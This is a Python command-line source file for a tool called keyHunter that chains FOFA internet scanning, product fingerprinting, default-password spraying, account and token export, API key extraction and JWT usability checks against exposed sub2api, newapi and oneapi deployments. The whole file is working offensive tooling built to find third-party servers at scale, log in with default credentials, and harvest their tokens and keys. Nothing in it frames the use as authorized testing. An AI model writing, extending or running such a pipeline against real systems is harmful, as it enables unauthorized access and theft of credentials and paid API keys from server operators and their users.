from __future__ import annotations

from pathlib import Path
from typing import Any

import typer
from rich.console import Console
from rich.table import Table

from keyhunter import __version__
from keyhunter.config import Settings
from keyhunter.export import export_session
from keyhunter.fingerprint import fingerprint_many
from keyhunter.fofa import FofaClient
from keyhunter.normalize import normalize_export_file
from keyhunter.products import get_product
from keyhunter.spray import spray_many
from keyhunter.util import read_json, write_json
from keyhunter.validate import validate_dir

app = typer.Typer(
    add_completion=False,
    no_args_is_help=True,
    help="keyHunter — FOFA discover → fingerprint → spray → export → normalize",
)
console = Console(stderr=True)


def _settings() -> Settings:
    return Settings.load()


def _load_origins(path: Path) -> list[str]:
    data = read_json(path)
    origins: list[str] = []
    if isinstance(data, list):
        for item in data:
            if isinstance(item, str):
                origins.append(item)
            elif isinstance(item, dict):
                origin = item.get("origin") or item.get("url")
                if origin:
                    # fingerprint output may filter matched only later
                    if item.get("matched") is False and "alive" in item:
                        continue
                    if item.get("ok") is False and "access_token" in item:
                        continue
                    origins.append(str(origin))
    elif isinstance(data, dict) and isinstance(data.get("hits"), list):
        for item in data["hits"]:
            if isinstance(item, dict) and item.get("origin"):
                origins.append(str(item["origin"]))
    # unique preserve order
    seen: set[str] = set()
    out: list[str] = []
    for o in origins:
        o = o.rstrip("/")
        if o not in seen:
            seen.add(o)
            out.append(o)
    return out


def _load_matched_origins(path: Path) -> list[str]:
    data = read_json(path)
    if not isinstance(data, list):
        return _load_origins(path)
    out: list[str] = []
    for item in data:
        if isinstance(item, dict) and item.get("matched") and item.get("origin"):
            out.append(str(item["origin"]).rstrip("/"))
        elif isinstance(item, str):
            out.append(item.rstrip("/"))
    return list(dict.fromkeys(out))


def _load_sessions(path: Path) -> list[dict[str, Any]]:
    data = read_json(path)
    if isinstance(data, list):
        return [x for x in data if isinstance(x, dict)]
    if isinstance(data, dict) and isinstance(data.get("sessions"), list):
        return [x for x in data["sessions"] if isinstance(x, dict)]
    return []


@app.callback()
def main_callback() -> None:
    """keyHunter CLI."""


@app.command("version")
def version_cmd() -> None:
    console.print(__version__)


@app.command("products")
def products_cmd() -> None:
    """List built-in product packs."""
    from keyhunter.products import PRODUCTS

    table = Table("id", "login", "export", "users", "passwords(approx)")
    for pid, p in PRODUCTS.items():
        table.add_row(
            pid,
            p.login_path,
            p.export_path,
            str(len(p.users())),
            str(len(p.passwords())),
        )
    console.print(table)


@app.command("discover")
def discover_cmd(
    product: str = typer.Option("sub2api", "--product", "-p"),
    query: str | None = typer.Option(None, "--query", "-q", help="Override single FOFA query"),
    out: Path = typer.Option(..., "--out", "-o", help="Output JSON path"),
) -> None:
    """Run FOFA queries and write unique origins."""
    settings = _settings()
    profile = get_product(product)
    queries = [query] if query else list(profile.fofa_queries)
    hits: list[dict[str, Any]] = []
    with FofaClient(settings) as client:
        for q in queries:
            console.print(f"[cyan]FOFA[/cyan] {q}")
            batch = client.search_all(q)
            console.print(f"  → {len(batch)} unique origins")
            hits.extend(batch)
    # dedupe by origin across queries
    seen: set[str] = set()
    unique: list[dict[str, Any]] = []
    for h in hits:
        origin = h.get("origin")
        if not origin or origin in seen:
            continue
        seen.add(str(origin))
        h["product"] = product
        unique.append(h)
    write_json(out, unique)
    console.print(f"[green]wrote {len(unique)} hits → {out}[/green]")


@app.command("fingerprint")
def fingerprint_cmd(
    product: str = typer.Option("sub2api", "--product", "-p"),
    infile: Path = typer.Option(..., "--in", "-i"),
    out: Path = typer.Option(..., "--out", "-o"),
) -> None:
    """Probe origins and keep product matches."""
    settings = _settings()
    profile = get_product(product)
    origins = _load_origins(infile)
    console.print(f"fingerprinting {len(origins)} origins as {product}")
    results = fingerprint_many(origins, profile, settings)
    write_json(out, results)
    matched = sum(1 for r in results if r.get("matched"))
    alive = sum(1 for r in results if r.get("alive"))
    console.print(f"[green]alive={alive} matched={matched} → {out}[/green]")


@app.command("spray")
def spray_cmd(
    product: str = typer.Option("sub2api", "--product", "-p"),
    infile: Path = typer.Option(..., "--in", "-i"),
    out: Path = typer.Option(..., "--out", "-o"),
    max_attempts: int | None = typer.Option(None, "--max-attempts"),
    matched_only: bool = typer.Option(True, "--matched-only/--all"),
) -> None:
    """Try default emails×passwords; write sessions (tokens on disk only)."""
    settings = _settings()
    profile = get_product(product)
    origins = _load_matched_origins(infile) if matched_only else _load_origins(infile)
    budget = str(max_attempts) if max_attempts is not None else "all"
    console.print(f"spraying {len(origins)} targets (max_attempts={budget}/host)")
    sessions = spray_many(origins, profile, settings, max_attempts=max_attempts)
    # redact tokens in console summary
    table = Table("origin", "ok", "email", "attempts")
    ok_n = 0
    for s in sessions:
        if s.get("ok"):
            ok_n += 1
        table.add_row(
            str(s.get("origin")),
            "yes" if s.get("ok") else "no",
            str(s.get("email") or "-"),
            str(s.get("attempts") or 0),
        )
    console.print(table)
    write_json(out, sessions)
    console.print(f"[green]sessions ok={ok_n}/{len(sessions)} → {out}[/green]")


@app.command("export")
def export_cmd(
    product: str = typer.Option("sub2api", "--product", "-p"),
    infile: Path = typer.Option(..., "--in", "-i"),
    out: Path = typer.Option(..., "--out", "-o", help="Output directory"),
) -> None:
    """Export accounts/tokens for successful sessions."""
    settings = _settings()
    profile = get_product(product)
    sessions = [s for s in _load_sessions(infile) if s.get("ok")]
    out.mkdir(parents=True, exist_ok=True)
    results: list[dict[str, Any]] = []
    for session in sessions:
        console.print(f"export {session.get('origin')}")
        results.append(export_session(session, profile, settings, out))
    write_json(out / "export_index.json", results)
    ok_n = sum(1 for r in results if r.get("ok"))
    accounts = sum(int(r.get("account_count") or 0) for r in results)
    console.print(f"[green]exports ok={ok_n} accounts≈{accounts} → {out}[/green]")


@app.command("normalize")
def normalize_cmd(
    infile: Path = typer.Option(..., "--in", "-i", help="exports directory or raw json"),
    out: Path = typer.Option(..., "--out", "-o"),
) -> None:
    """Convert raw Sub2API exports into CPA artifacts + finding index."""
    out.mkdir(parents=True, exist_ok=True)
    raw_files: list[Path] = []
    origin_map: dict[str, str] = {}
    if infile.is_dir():
        raw_dir = infile / "raw"
        index_path = infile / "export_index.json"
        if index_path.exists():
            for item in read_json(index_path):
                if isinstance(item, dict) and item.get("raw_path"):
                    origin_map[str(item["raw_path"])] = str(item.get("origin") or "")
        if raw_dir.is_dir():
            raw_files = sorted(raw_dir.glob("*.json"))
        else:
            raw_files = sorted(infile.glob("*.json"))
    elif infile.is_file():
        raw_files = [infile]
    else:
        raise typer.BadParameter(f"not found: {infile}")

    summaries = []
    for raw in raw_files:
        origin = origin_map.get(str(raw), origin_map.get(str(raw.resolve()), ""))
        summaries.append(normalize_export_file(raw, out, origin_hint=origin))
    write_json(out / "normalize_summary.json", summaries)
    total = sum(int(s.get("count") or 0) for s in summaries)
    hv = sum(int(s.get("high_value") or 0) for s in summaries)
    console.print(f"[green]normalized accounts={total} high_value={hv} → {out}[/green]")


@app.command("validate")
def validate_cmd(
    infile: Path = typer.Option(..., "--in", "-i", help="artifacts directory from normalize"),
    out: Path = typer.Option(..., "--out", "-o"),
) -> None:
    """Check JWT expiry / refresh presence for CPA artifacts."""
    summary = validate_dir(infile, out)
    console.print(
        f"[green]usable={summary['usable']}/{summary['total']} "
        f"alive_access={summary['access_alive']} refresh={summary['with_refresh']} → {out}[/green]"
    )


@app.command("hunt")
def hunt_cmd(
    product: str = typer.Option("sub2api", "--product", "-p"),
    url: str | None = typer.Option(None, "--url", help="Single origin; skips FOFA"),
    out: Path = typer.Option(..., "--out", "-o"),
    max_attempts: int | None = typer.Option(None, "--max-attempts"),
    skip_normalize: bool = typer.Option(False, "--skip-normalize"),
) -> None:
    """Run the full pipeline into an output directory."""
    profile = get_product(product)
    product_id = profile.id
    out.mkdir(parents=True, exist_ok=True)

    if url:
        hits = [{"origin": url.rstrip("/"), "product": product_id, "source": "manual"}]
        write_json(out / "hits.json", hits)
    else:
        discover_cmd(product=product_id, query=None, out=out / "hits.json")

    fingerprint_cmd(product=product_id, infile=out / "hits.json", out=out / "alive.json")
    spray_cmd(
        product=product_id,
        infile=out / "alive.json",
        out=out / "sessions.json",
        max_attempts=max_attempts,
        matched_only=True,
    )
    export_cmd(product=product_id, infile=out / "sessions.json", out=out / "exports")
    if not skip_normalize:
        if product_id == "sub2api":
            normalize_cmd(infile=out / "exports", out=out / "artifacts")
            validate_cmd(infile=out / "artifacts", out=out / "valid.json")
        elif product_id in {"newapi", "oneapi"}:
            from keyhunter.normalize import normalize_newapi_exports

            summary = normalize_newapi_exports(out / "exports", out / "artifacts", product_id)
            console.print(
                f"[green]extracted keys={summary.get('key_count', 0)} → {out / 'artifacts'}[/green]"
            )
    console.print(f"[bold green]hunt complete → {out}[/bold green]")


if __name__ == "__main__":
    app()
